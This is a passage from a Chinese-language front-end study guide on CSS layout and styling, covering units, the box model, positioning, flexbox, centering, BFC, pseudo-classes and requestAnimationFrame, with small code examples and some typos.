id="px-em-rem-vw"><a href="#px-em-rem-vw" class="header-anchor">#</a> px em rem vw</h4> <ul><li><code>px</code>：(pixel 像素的缩写)，相对于显示器屏幕分辨率;</li> <li><code>em</code>：相对于父元素的 <code>font-size</code>;</li> <li><code>rem</code>：<strong>可想成 <code>root-em</code></strong>，相对于 root（html）的 <code>font-size</code>;</li> <li><code>vw</code>：<strong>相对视口（viewport）的宽度</strong>而定的，长度等于视口宽度的 1/100;</li> <li>除此之外还有 pt、ex 等单位；</li></ul> <h3 id="_3-盒子模型"><a href="#_3-盒子模型" class="header-anchor">#</a> 3:盒子模型</h3> <p><strong>简写设置规则</strong>：1个【上右下左】， 2个【(上下)(左右)】，3个【上(左右)下】</p> <p><strong>盒模型</strong>： CSS盒模型<code>本质上是一个盒子，封装周围的HTML元素</code>，它包括：<strong>边距(margin)，边框(border)，填充(padding)，和实际内容(content)</strong>。盒模型允许我们<strong>在其它元素和周围元素边框之间的空间放置元素</strong>。</p> <p><strong>有两种</strong>： IE 盒子模型、W3C 盒子模型；
<strong>区  别</strong>： <code>IE的content部分把 border 和 padding计算了进去</code>;
<strong>CSS 中有个属性叫 <code>box-sizing</code></strong>： box-sizing: content-box|border-box|inherit;</p> <p><img src="/rat-summ/assets/img/11-00-26.425012dc.jpg" alt="img"></p> <h4 id="兼容性设置"><a href="#兼容性设置" class="header-anchor">#</a> 兼容性设置</h4> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token comment">/*兼容性设置*/</span>
<span class="token selector">*, *:before, *:after</span> <span class="token punctuation">{</span>
  <span class="token property">-moz-box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>
  <span class="token property">-webkit-box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>
  <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="相关属性【mbpc】"><a href="#相关属性【mbpc】" class="header-anchor">#</a> 相关属性【mbpc】</h4> <ul><li>margin：盒子外边距; 外边距</li> <li>border：盒子边框宽度;</li> <li>padding：盒子内边距; 内边距</li> <li>width：盒子宽度(content)</li> <li>height：盒子高度(content)</li></ul> <p><strong>不可继承的样式</strong>：margin border padding width height ;【mbpc】</p> <blockquote><h4 id="不使用-border-画出1px高的线-在不同浏览器的标准与怪异模式下都能保持一致效果"><a href="#不使用-border-画出1px高的线-在不同浏览器的标准与怪异模式下都能保持一致效果" class="header-anchor">#</a> 不使用 border 画出1px高的线，在不同浏览器的标准与怪异模式下都能保持一致效果</h4></blockquote> <p>height(1) 及 overflow(hidden)</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token style language-css"><span class="token property">height</span><span class="token punctuation">:</span>1px<span class="token punctuation">;</span><span class="token property">overflow</span><span class="token punctuation">:</span>hidden<span class="token punctuation">;</span><span class="token property">background</span><span class="token punctuation">:</span>red</span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><blockquote><h4 id="用纯css创建一个三角形的原理是什么"><a href="#用纯css创建一个三角形的原理是什么" class="header-anchor">#</a> 用纯CSS创建一个三角形的原理是什么</h4></blockquote> <p>把上、左、右三条边隐藏掉（<strong>通过border 颜色设为 transparent</strong>）</p> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token selector">#demo</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">border-width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
  <span class="token property">border-style</span><span class="token punctuation">:</span> solid<span class="token punctuation">;</span>
  <span class="token property">border-color</span><span class="token punctuation">:</span> transparent transparent red transparent<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="_4-布局相关设置【pdfoz】"><a href="#_4-布局相关设置【pdfoz】" class="header-anchor">#</a> 4:布局相关设置【PDFOZ】</h3> <ul><li>postion</li> <li>display</li> <li>float</li> <li>overflow</li> <li>z-index</li></ul> <h4 id="position-定位方式"><a href="#position-定位方式" class="header-anchor">#</a> position 定位方式</h4> <p><strong>定位</strong>: left（左），right（右），top（上），bottom（下）离页面顶点的距离</p> <p><strong>设置</strong>：【SRAFI】</p> <ul><li><code>static</code> <strong>默认值</strong>。没有定位，元素出现在正常的流中（<strong>忽略 top, bottom, left, right z-index 声明</strong>）。</li> <li><code>relative</code> 生成相对定位的元素，<strong>相对于其正常位置</strong>进行定位。</li> <li><code>absolute</code> 生成绝对定位的元素，<strong>相对于值不为 static的第一个父元素</strong>进行定位。 fixed也可以；如果先辈元素全是<code>static</code>，那么相对于<strong>视口</strong>定位；（特殊情况）；<strong>如果无已定位祖先元素, 以body元素为偏移参照基准, 完全脱离了标准文档流。</strong></li> <li><code>fixed</code> 生成绝对定位的元素，相对于<strong>浏览器窗口</strong>进行定位 ；悬浮设置后，宽高会自适应，记得设置 <code>width: 100%</code>,及定位设置；一个固定定位元素<strong>不会保留它原本在页面应有的空隙</strong>。（老IE不支持）；如果先辈元素有 <code>非none</code>的 <code>transform</code>属性，那么相对于该先辈元素定位（不注意容易产生BUG）</li> <li><code>inherit</code> 继承; 规定从父元素继承 position 属性的值。</li></ul> <h5 id="absolute和fixed定位的比较"><a href="#absolute和fixed定位的比较" class="header-anchor">#</a> <strong><code>absolute</code>和<code>fixed</code>定位的比较</strong></h5> <ul><li><p>共同点：<strong>改变行内元素的呈现方式，都脱离了文档流</strong>；</p></li> <li><p>不同点：absolute的**”根元素“是可以设置<strong>的，fixed的</strong>“根元素”固定为浏览器窗口**</p></li></ul> <h4 id="display的设置"><a href="#display的设置" class="header-anchor">#</a> display的设置</h4> <table><thead><tr><th>单位</th> <th>描述</th></tr></thead> <tbody><tr><td>none</td> <td><strong>元素不显示，并从文档流中移除。</strong></td></tr> <tr><td>block</td> <td><strong>块类型</strong>。默认宽度为父元素宽度，可设置宽高，<strong>换行显示</strong>。</td></tr> <tr><td>inline</td> <td><strong>行内元素类型</strong>。默认宽度为内容宽度，不可设置宽高(top,bottom)，<strong>同行显示</strong>。</td></tr> <tr><td><strong>inline-block</strong></td> <td><strong>默认宽度为内容宽度，可以设置宽高，同行显示。</strong></td></tr> <tr><td>inherit</td> <td>规定应该<strong>从父元素继承 display 属性</strong>的值。</td></tr> <tr><td>table</td> <td>此元素会作<strong>为块级表格来显示</strong>。表格显示；</td></tr> <tr><td>list-item</td> <td>象块类型元素一样显示，并添加样式列表标记。项目列表；</td></tr></tbody></table> <h5 id="行内-inline-块级-block-空-void-元素"><a href="#行内-inline-块级-block-空-void-元素" class="header-anchor">#</a> 行内(inline)/块级(block)/空(void)元素</h5> <blockquote><p>首先：CSS规范规定，<strong>每个元素都有display属性，确定该元素的类型，每个元素都有默认的display值</strong>，</p> <p>如span默认display属性值为“inline”，是“行内”元素; div的display默认值为“block”，则为“块级”元素；</p></blockquote> <p><strong>行内(inline)元素</strong>：<code>宽度和高度由内容决定</code>，<strong>与其他元素共占一行的元素</strong>;  内边距的top/bottom(padding-top/padding-bottom)和外边距的top/bottom(margin-top/margin-bottom)都不可改变（<strong>也就是padding和margin的left和right是可以设置的</strong>），就是里面文字或图片的大小。</p> <p>​		如：<strong>i a b span select strong</strong></p> <p><strong>块级(block)元素</strong>：<code>默认宽度由父容器决定，默认高度由内容决定</code>，<strong>独占一行并且可以设置宽高的元素</strong>;</p> <p>​		如：<strong>div ul ol li dl dt dd h1 h2 h3 h4…p</strong></p> <p>浏览器还有默认的<strong>天生inline-block【空】元素</strong>（拥有<strong>内在尺寸，可设置高宽，但不会自动换行</strong>）</p> <p>​       如：<strong><code>&lt;input&gt; 、&lt;img&gt; 、&lt;button&gt; 、&lt;texterea&gt; 、&lt;label&gt;</code></strong></p> <h4 id="float-浮动属性"><a href="#float-浮动属性" class="header-anchor">#</a> float 浮动属性</h4> <p><code>left</code> 左浮动
<code>right</code> 右浮动
<code>clear</code> 清除浮动;  <strong>clear：both</strong></p> <p>注：设置 Flex 布局后，子元素的 float 布局将失效；</p> <h5 id="清除浮动的方法【要点】"><a href="#清除浮动的方法【要点】" class="header-anchor">#</a> 清除浮动的方法【要点】</h5> <p>浮动会脱离文档流，浮动可以内联排列，<strong>会导致父元素高度坍塌</strong></p> <blockquote><p>清除浮动的原理：基本上都是<code>clear:both</code></p></blockquote> <p><strong>方式</strong>：</p> <ol><li>在同一级加一个div，style是clear:both;</li> <li>给父元素添加 <code>overflow:auto</code> 或者hidden  样式，触发BFC; （<strong>让父元素的高度包含子浮动元素</strong>）</li> <li>父元素加伪元素 <code>.clearfix:after { display: block; content: &quot; &quot;; clear: both; }</code></li> <li>flex布局能够替代浮动布局;</li></ol> <h4 id="overflow-溢出处理"><a href="#overflow-溢出处理" class="header-anchor">#</a> overflow 溢出处理</h4> <ul><li><code>hidden</code>  隐藏超出层大小的内容</li> <li><code>scroll</code> 无论内容是否超出层大小都添加滚动条</li> <li><code>auto</code>  超出时自动添加滚动条</li></ul> <h4 id="z-index网页的层叠等级"><a href="#z-index网页的层叠等级" class="header-anchor">#</a> z-index网页的层叠等级</h4> <p><strong>z-index 层覆盖先后顺序</strong>（优先级）; 大于0的数字；数字大的最上面</p> <h4 id="设置dom元素不显示在浏览器可视范围内"><a href="#设置dom元素不显示在浏览器可视范围内" class="header-anchor">#</a> 设置DOM元素不显示在浏览器可视范围内</h4> <blockquote><h4 id="opacity-0、visibility-hidden、display-none、z-index-1-及比较-【ovdz】"><a href="#opacity-0、visibility-hidden、display-none、z-index-1-及比较-【ovdz】" class="header-anchor">#</a> opacity：0、visibility:hidden、display:none、z-index=-1 及比较；【OVDZ】</h4></blockquote> <ol><li><strong>opacity：0</strong>,该元素隐藏起来了，<strong>但不会改变页面布局</strong>，并且，<strong>如果该元素已经绑定了一些事</strong>件，如click事件也能触发</li> <li><strong>visibility:hidden</strong>,该元素隐藏起来了，<strong>但不会改变页面布局</strong>，但是<strong>不会触发该元素已经绑定的事件</strong>; （重绘）</li> <li>display:none, 把元素隐藏起来，并且<strong>会改变页面布局</strong>，可以理解成在页面中把该元素删掉; （回流+重绘）</li> <li>z-index=-1置于其他元素下面; <strong>注意</strong>：z-index的数值<strong>不跟单位</strong>。z-index的数字越高越靠前，并且值必须为整数和正数（正数的整数）。</li></ol> <p><strong>总括</strong>：</p> <p><strong>最基本的</strong>：设置visibility属性为hidden，或者设置display属性为none</p> <p><strong>技巧性</strong>：设置透明度为0，设置z-index位置在-1000,  设置宽高为0</p> <h3 id="_5-flex-布局"><a href="#_5-flex-布局" class="header-anchor">#</a> 5:Flex 布局</h3> <p>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来<strong>为盒状模型提供最大的灵活性</strong>。</p> <p>行内元素也可以使用 Flex 布局。<code>display: inline-flex;</code>Webkit 内核的浏览器，必须加上<code>-webkit</code>前缀。<code>display: -webkit-flex; /* Safari */</code></p> <p>注意，<strong>设为 Flex 布局以后，<code>子元素的float、clear和vertical-align属性将失效</code>。</strong></p> <h4 id="flex-1简写"><a href="#flex-1简写" class="header-anchor">#</a> flex:1简写</h4> <p><strong><code>flex</code>属性是<code>flex-grow</code>, <code>flex-shrink</code> 和 <code>flex-basis</code>的简写，默认值为<code>0 1 auto</code>。后两个属性可选。</strong>【GSB———&gt; 0 1 auto】</p> <h4 id="父元素属性-6个"><a href="#父元素属性-6个" class="header-anchor">#</a> <strong>父元素属性</strong>（6个）</h4> <table><thead><tr><th>属性名</th> <th>属性值</th> <th>备注</th></tr></thead> <tbody><tr><td>display</td> <td>flex</td> <td>定义了一个flex容器，它的直接子元素会接受这个flex环境</td></tr> <tr><td><strong>flex-direction</strong></td> <td>row,row-reverse,column,column-reverse</td> <td>决定主轴的方向</td></tr> <tr><td>flex-wrap</td> <td>nowrap,wrap,wrap-reverse</td> <td>如果一条轴线排不下，如何换行</td></tr> <tr><td>flex-flow</td> <td>[flex-direction] , [flex-wrap]</td> <td>是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式，默认值为<code>row nowrap</code></td></tr> <tr><td><strong>justify-content</strong></td> <td>flex-start,flex-end,center,space-between,space-around</td> <td>设置或检索弹性盒子元素在主轴（横轴）方向上的对齐方式【JC横水】</td></tr> <tr><td><strong>align-items</strong></td> <td>flex-start,flex-end,center,baseline,stretch</td> <td>设置或检索弹性盒子元素在侧轴（纵轴）方向上的对齐方式【AI纵竖】</td></tr></tbody></table> <h4 id="子元素属性-6个"><a href="#子元素属性-6个" class="header-anchor">#</a> <strong>子元素属性</strong>（6个）</h4> <table><thead><tr><th>属性名</th> <th>属性值</th> <th>备注</th></tr></thead> <tbody><tr><td>order</td> <td>[int]</td> <td>默认情况下flex order会按照书写顺训呈现，可以通过order属性改变，数值小的在前面，还可以是负数。</td></tr> <tr><td>flex-grow</td> <td>[number]</td> <td>设置或检索弹性盒的<strong>扩展比率</strong>,根据弹性盒子元素所设置的扩展因子作为比率来分配剩余空间</td></tr> <tr><td>flex-shrink</td> <td>[number]</td> <td>设置或检索弹性盒的<strong>收缩比率</strong>,根据弹性盒子元素所设置的收缩因子作为比率来收缩空间</td></tr> <tr><td>flex-basis</td> <td>[length], auto</td> <td>设置或检索弹性盒伸<strong>缩基准值</strong></td></tr> <tr><td><strong>align-self</strong></td> <td>auto,flex-start,flex-end,center,baseline,stretch</td> <td>设置或检索弹性盒子元素在侧轴（纵轴）方向上的对齐方式，<strong>可以覆盖父容器align-items的设置</strong></td></tr> <tr><td>flex</td> <td>[number]</td> <td>占比</td></tr></tbody></table> <h3 id="_6-水平-垂直居中"><a href="#_6-水平-垂直居中" class="header-anchor">#</a> 6:水平/垂直居中</h3> <h4 id="水平居中"><a href="#水平居中" class="header-anchor">#</a> 水平居中</h4> <ul><li>元素为行内元素(inline)，设置父元素text-align:center</li> <li>如果元素宽度固定，可以设置左右margin为auto</li> <li>如果元素为绝对定位，设置父元素position为relative，元素设 left:0;right:0;margin:auto</li> <li>使用flex-box布局，指定justify-content属性为center</li></ul> <h4 id="垂直-水平居中"><a href="#垂直-水平居中" class="header-anchor">#</a> 垂直/水平居中</h4> <ul><li><p>文本水平居中：<code>text-algin: center</code></p></li> <li><p>文本垂直居中：<code>line-height</code>等于容器<code>height</code>；<code>display: flex; algin-items: center;</code></p></li> <li><p>div水平居中：【核心】</p> <ol><li>margin: 0 auto;</li> <li><strong>已知父元素宽度：margin-left: width / 2; left:50%</strong>[x]transform: tranlateX(-50%)</li> <li><strong>未知父元素宽度：position: absolute: left: 50%; transform: tranlateX(-50%)</strong> ; tranlateX等同于<code>translate(-50%, 0)</code></li> <li>display: flex; justify-content: center;</li></ol></li> <li><p>div垂直居中：【核心】</p> <ol><li>**已知父元素高度：margin-top: height / 2; top:50%; **[x] transform: tranlateY(-50%)</li> <li><strong>未知父元素高度：position: absolute: top: 50%; transform: tranlateY(-50%)</strong></li> <li>display: flex; algin-items: center;</li></ol></li> <li><p>div水平垂直居中；上面两情况合并在一起；【核心】</p> <p><strong>绝对定位</strong> 定宽情况下；</p> <div class="language-less line-numbers-mode"><pre class="language-less"><code><span class="token selector">.son</span> <span class="token punctuation">{</span>
    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
  
    <span class="token property">width</span><span class="token punctuation">:</span> 宽度<span class="token punctuation">;</span>
    <span class="token property">left</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
    <span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token operator">-</span>0.5宽度<span class="token punctuation">;</span><span class="token comment">//-宽度/2</span>
  
    <span class="token property">height</span><span class="token punctuation">:</span> 高度<span class="token punctuation">;</span>
    <span class="token property">top</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
    <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token operator">-</span>0.5高度<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>**绝对定位 **不定宽情况下； 案例：登陆页面居中，再右偏移250px;</p> <div class="language-less line-numbers-mode"><pre class="language-less"><code><span class="token selector">.login-wapper</span><span class="token punctuation">{</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">right</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
  <span class="token selector">.login-form</span><span class="token punctuation">{</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 280px<span class="token punctuation">;</span>
    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    <span class="token property">left</span><span class="token punctuation">:</span> ~<span class="token string">&quot;calc(50% + 150px)&quot;</span><span class="token punctuation">;</span> <span class="token comment">//水平方向</span>
    <span class="token property">top</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span><span class="token comment">//垂直方向</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span><span class="token operator">-</span>50%<span class="token punctuation">,</span><span class="token operator">-</span>50%<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//水平垂直方向；</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div></li></ul> <h3 id="_7-bfc"><a href="#_7-bfc" class="header-anchor">#</a> 7:BFC</h3> <h4 id="常见触发bfc【pdfoz】"><a href="#常见触发bfc【pdfoz】" class="header-anchor">#</a> 常见触发BFC【PDFOZ】</h4> <ul><li>根元素，即HTML元素;</li> <li><code>position</code>的值不为<code>relative</code>和<code>static</code> ；为<code>absolute</code>, <code>fixed</code>。 【af】</li> <li><code>display</code>的值为<code>table-cell</code>, <code>table-caption</code>, <code>inline-block</code>, <code>flex</code>中的任何一个。【table-x, inline-block】</li> <li><code>float</code>的值不为<code>none</code>； 为<code>left</code>, <code>right</code>。<strong>float:left</strong> 浮动元素本身BFC化，然而<strong>浮动元素有破坏性和包裹性，失去了元素本身的流体自适应性</strong>;【lr】</li> <li><code>overflow</code>的值不为<code>visible</code>； 为<code>auto</code>,<code>scroll</code>或<code>hidden</code> 。清除浮动: <code>.clearfix { overflow: hidden; zoom: 1; }</code>   详见下面介绍； 【ash】</li> <li>定制了一个新的属性值：<code>display:flow-root</code>。 可以使用display:flow-root安全的创建BFC，来解决上文中提到的各种问题：<strong>包裹浮动元素</strong>、<strong>阻止外边距叠加</strong>和<strong>阻止围绕浮动元素</strong>。 目前还有兼容性问题；<strong>flow-root 浏览器支持情况</strong> https://caniuse.com/</li></ul> <p>简单描述优化处理：【PDFOZ】</p> <ul><li>根元素;</li> <li>position为fixed和absolute的元素， 不为<code>relative</code>和<code>static</code> ;</li> <li>display为inline-block、table-cell、table-caption，flex，inline-flex的元素;不为none;</li> <li>float为left,right; 不为none的元素;</li> <li>overflow 为<code>auto</code>,<code>scroll</code>或<code>hidden</code> , 不为visible的元素;</li></ul> <h3 id="_8-css3"><a href="#_8-css3" class="header-anchor">#</a> 8:css3</h3> <h4 id="伪类-伪元素"><a href="#伪类-伪元素" class="header-anchor">#</a> 伪类/伪元素</h4> <p><strong>比较及案例</strong></p> <ul><li>伪类选择元素<strong>基于的是当前元素处于的状态</strong>，或者说元素当前所具有的特性，功能和class有些类似，但它是<strong>基于文档之外的抽象</strong>，所以叫伪类（:first-child :link :visitive :hover :focus :lang）；在官方定义中规定单冒号都为伪类，</li> <li>伪元素<strong>控制的内容实际上和元素是相同的，但是它本身只是基于元素的抽象</strong>，<strong>不存在于文档中</strong>，所以叫伪元素（:first-line :first-letter :befoe :after); 而伪元素的使用中<strong>可以用单冒号和双冒号都可以实现伪元素的使用</strong>，但是较规范而言<strong>建议使用双冒号来实现</strong>。<strong>[2:元]</strong> 二次元；</li></ul> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token comment">/*最常见的伪类选择器, 注意这里的顺序：【LVHA】*/</span>
<span class="token selector">a:link</span><span class="token punctuation">{</span> <span class="token property">color</span><span class="token punctuation">:</span> #ff6600 <span class="token punctuation">}</span> <span class="token comment">/* 未被访问的链接 */</span>
<span class="token selector">a:visited</span><span class="token punctuation">{</span> <span class="token property">color</span><span class="token punctuation">:</span> #87b291 <span class="token punctuation">}</span> <span class="token comment">/* 已被访问的链接 */</span>
<span class="token selector">a:hover</span><span class="token punctuation">{</span> <span class="token property">color</span><span class="token punctuation">:</span> #6535b2 <span class="token punctuation">}</span> <span class="token comment">/* 鼠标指针移动到链接上 */</span>
<span class="token selector">a:active</span><span class="token punctuation">{</span> <span class="token property">color</span><span class="token punctuation">:</span> #55b28e <span class="token punctuation">}</span> <span class="token comment">/* 正在被点击的链接 */</span>   	

<span class="token property">p</span><span class="token punctuation">:</span>first-of-type	选择属于其父元素的首个 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。
<span class="token property">p</span><span class="token punctuation">:</span>last-of-type	选择属于其父元素的最后 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。
<span class="token property">p</span><span class="token punctuation">:</span>only-of-type	选择属于其父元素唯一的 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。
<span class="token property">p</span><span class="token punctuation">:</span>only-child		选择属于其父元素的唯一子元素的每个 &lt;p&gt; 元素。
<span class="token property">p</span><span class="token punctuation">:</span><span class="token function">nth-child</span><span class="token punctuation">(</span>2<span class="token punctuation">)</span>	选择属于其父元素的第二个子元素的每个 &lt;p&gt; 元素。

<span class="token comment">/*而伪元素的使用中**可以用单冒号和双冒号都可以实现伪元素的使用**，但是较规范而言**建议使用双冒号来实现***/</span>
<span class="token selector">a::after</span> <span class="token punctuation">{</span><span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">}</span>
<span class="token selector">a::before</span> <span class="token punctuation">{</span><span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h4 id="动画及新特性"><a href="#动画及新特性" class="header-anchor">#</a> 动画及新特性</h4> <ul><li>transition：过渡</li> <li>transform：旋转、缩放、移动或者倾斜</li> <li>animation：动画</li> <li>gradient：渐变</li> <li>shadow：阴影
<ul><li>文字阴影: text-shadow: 2px 2px 2px #000;</li> <li>(水平阴影，垂直阴影，模糊距离，阴影颜色) 盒子阴影: box-shadow: 10px 10px 5px #999</li> <li>text-overflow 超过指定容器的边界时如何显示</li> <li>text-decoration 文字渲染</li></ul></li> <li>border-radius：圆角</li> <li>word-wrap 文字换行</li> <li>gradient渐变效果</li> <li>transition过渡效果 transition-duration：过渡的持续时间</li> <li>transform拉伸，压缩，旋转，偏移等变换</li> <li>animation动画</li></ul> <p>简单实用示范：</p> <div class="language-css line-numbers-mode"><pre class="language-css"><code><span class="token selector">&amp;.retract</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">-webkit-transition</span><span class="token punctuation">:</span> all 0.3s<span class="token punctuation">;</span>
  <span class="token property">transition</span><span class="token punctuation">:</span> all 0.3s<span class="token punctuation">;</span>
  <span class="token property">border-right</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">&amp;.expaned</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 230px<span class="token punctuation">;</span>
  <span class="token property">min-width</span><span class="token punctuation">:</span> 230px<span class="token punctuation">;</span>
  <span class="token property">-webkit-transition</span><span class="token punctuation">:</span> all 0.3s<span class="token punctuation">;</span>
  <span class="token property">transition</span><span class="token punctuation">:</span> all 0.3s<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h5 id="transition和animation的区别"><a href="#transition和animation的区别" class="header-anchor">#</a> transition和animation的区别</h5> <p>Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是<code>transition需要触发一个事件才能改变属性</code>，<strong>而<code>animation不需要触发任何事件的情况下才会随时间改变属性值</code>，并且transition为2帧</strong>，从from .... to，而animation可以一帧一帧的。</p> <blockquote><h4 id="如果需要手动写动画-你认为最小时间间隔是多久"><a href="#如果需要手动写动画-你认为最小时间间隔是多久" class="header-anchor">#</a> <strong>如果需要手动写动画，你认为最小时间间隔是多久?</strong></h4></blockquote> <p>多数显示器默认频率是60Hz，即1秒刷新60次，所以<strong>理论上最小间隔为1/60＊1000ms ＝ 16.7ms</strong></p> <h5 id="requestanimationframe-raf"><a href="#requestanimationframe-raf" class="header-anchor">#</a> requestAnimationFrame (RAF)</h5> <p>requestAnimationFrame 并不是定时器，但和 setTimeout 很相似，<strong>在没有 requestAnimationFrame 的浏览器一般都是用 setTimeout 模拟</strong>。</p> <p>requestAnimationFrame 跟屏幕刷新同步，大多数屏幕的刷新频率都是 60Hz，对应的 requestAnimationFrame 大概每隔 16.7ms 触发一次，<strong>如果屏幕刷新频率更高，requestAnimationFrame 也会更快触发</strong>。基于这点，在支持 requestAnimationFrame 的浏览器还使用 setTimeout 做动画显然是不明智的。</p> <p><code>requestAnimationFrame</code> 本来就是为动画而生的，所以在处理 js 动画不在话下，与定时器的用法非常相似;</p> <ol><li><code>requestAnimationFrame</code> 会把每一帧中的所有 DOM 操作集中起来，<strong>在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率;</strong></li> <li>在隐藏或不可见的元素中，<code>requestAnimationFrame</code> 将不会进行重绘或回流，这当然就意味着更少的 CPU、GPU 和内存使用量</li></ol> <p>下面是一个例子，点击元素时开始转动，再次点击转动速速增加。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> deg <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> id<span class="token punctuation">;</span>
<span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;div&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
div<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        self<span class="token punctuation">.</span>style<span class="token punctuation">.</span>transform <span class="token operator">=</span> <span class="token string">'rotate('</span> <span class="token operator">+</span> <span class="token punctuation">(</span>deg<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'deg)'</span><span class="token punctuation">;</span>
        id <span class="token operator">=</span> <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>change<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
